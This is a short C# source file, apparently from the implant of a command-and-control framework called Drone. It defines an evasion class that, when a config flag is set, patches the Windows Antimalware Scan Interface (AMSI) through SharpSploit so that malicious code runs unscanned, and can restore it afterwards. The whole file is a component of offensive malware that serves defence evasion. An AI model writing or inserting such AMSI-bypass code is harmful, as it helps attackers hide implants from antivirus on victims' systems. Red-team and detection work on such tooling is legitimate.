using Drone.SharpSploit.Evasion;

namespace Drone
{
    public class DroneEvasion
    {
        private readonly DroneConfig _config;

        private Amsi _amsi;

        public DroneEvasion(DroneConfig config)
        {
            _config = config;
        }

        public void BypassAmsi()
        {
            var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");

            if (!bypassAmsi) return;
            
            _amsi = new Amsi();
            _amsi.Patch();
        }

        public void RestoreAmsi()
        {
            var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");
            if (bypassAmsi) _amsi.Restore();
        }
    }
}